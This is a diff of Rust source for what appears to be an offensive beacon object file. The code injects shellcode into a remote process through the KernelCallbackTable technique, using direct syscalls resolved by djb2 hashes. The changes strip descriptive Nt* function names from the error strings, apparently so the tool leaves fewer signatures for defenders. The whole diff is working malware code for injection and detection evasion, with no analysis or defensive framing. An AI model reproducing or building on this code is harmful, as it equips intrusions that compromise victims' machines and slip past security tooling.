@@ -119,27 +119,27 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     // 1. NtOpenProcess
     static OP: SyscallEntry = SyscallEntry::new();
     let (op_s, op_a) = unsafe { resolve(&OP, common::hash::djb2(b"NtOpenProcess")) }
-        .map_err(|_| "resolve NtOpenProcess")?;
+        .map_err(|_| "resolve")?;
     let oa = ObjectAttributes { length: 48, _rest: [0; 5] };
     let cid = ClientId { unique_process: pid as usize, unique_thread: 0 };
     let mut h_proc: usize = 0;
     let st = unsafe { do_syscall4(&mut h_proc as *mut _ as usize, PROCESS_ALL as usize, &oa as *const _ as usize, &cid as *const _ as usize, op_s, op_a) };
-    if st != STATUS_SUCCESS || h_proc == 0 { common::evasion::secure_zero(&mut sc); return Err("NtOpenProcess failed"); }
+    if st != STATUS_SUCCESS || h_proc == 0 { common::evasion::secure_zero(&mut sc); return Err("proc open failed"); }
 
     // 2. NtQueryInformationProcess → PEB addr
     static QI: SyscallEntry = SyscallEntry::new();
     let (qi_s, qi_a) = unsafe { resolve(&QI, common::hash::djb2(b"NtQueryInformationProcess")) }
-        .map_err(|_| "resolve NtQueryInformationProcess")?;
+        .map_err(|_| "resolve")?;
     let mut pbi = [0u8; 48];
     let mut ret: u32 = 0;
     let st2 = unsafe { do_syscall5(h_proc, 0, pbi.as_mut_ptr() as usize, 48, &mut ret as *mut _ as usize, qi_s, qi_a) };
-    if st2 != STATUS_SUCCESS { close_h(h_proc); common::evasion::secure_zero(&mut sc); return Err("NtQueryInformationProcess failed"); }
+    if st2 != STATUS_SUCCESS { close_h(h_proc); common::evasion::secure_zero(&mut sc); return Err("query failed"); }
     let peb_addr = unsafe { core::ptr::read_unaligned(pbi.as_ptr().add(8) as *const usize) };
 
     // 3. Read PEB.KernelCallbackTable (offset 0x58 on x64)
     static RD: SyscallEntry = SyscallEntry::new();
     let (rd_s, rd_a) = unsafe { resolve(&RD, common::hash::djb2(b"NtReadVirtualMemory")) }
-        .map_err(|_| "resolve NtReadVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut kct_addr: usize = 0;
     let mut rd_n: usize = 0;
     let st3 = unsafe { do_syscall5(h_proc, peb_addr + 0x58, &mut kct_addr as *mut _ as usize, 8, &mut rd_n as *mut _ as usize, rd_s, rd_a) };
@@ -153,7 +153,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     // 5. Alloc shellcode in target (RW)
     static AL: SyscallEntry = SyscallEntry::new();
     let (al_s, al_a) = unsafe { resolve(&AL, common::hash::djb2(b"NtAllocateVirtualMemory")) }
-        .map_err(|_| "resolve NtAllocateVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut sc_base: usize = 0;
     let mut sc_sz: usize = sc.len();
     let st5 = unsafe { do_syscall6(h_proc, &mut sc_base as *mut _ as usize, 0, &mut sc_sz as *mut _ as usize, (MEM_COMMIT|MEM_RESERVE) as usize, PAGE_READWRITE as usize, al_s, al_a) };
@@ -162,7 +162,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     // Write shellcode
     static WR: SyscallEntry = SyscallEntry::new();
     let (wr_s, wr_a) = unsafe { resolve(&WR, common::hash::djb2(b"NtWriteVirtualMemory")) }
-        .map_err(|_| "resolve NtWriteVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut wr_n: usize = 0;
     let st6 = unsafe { do_syscall5(h_proc, sc_base, sc.as_ptr() as usize, sc.len(), &mut wr_n as *mut _ as usize, wr_s, wr_a) };
     common::evasion::secure_zero(&mut sc);
@@ -171,7 +171,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     // 6. Protect → RX
     static PR: SyscallEntry = SyscallEntry::new();
     let (pr_s, pr_a) = unsafe { resolve(&PR, common::hash::djb2(b"NtProtectVirtualMemory")) }
-        .map_err(|_| "resolve NtProtectVirtualMemory")?;
+        .map_err(|_| "resolve")?;
     let mut b2 = sc_base; let mut s2 = wr_n; let mut op2: u32 = 0;
     let _ = unsafe { do_syscall5(h_proc, &mut b2 as *mut _ as usize, &mut s2 as *mut _ as usize, PAGE_EXECUTE_READ as usize, &mut op2 as *mut _ as usize, pr_s, pr_a) };
 
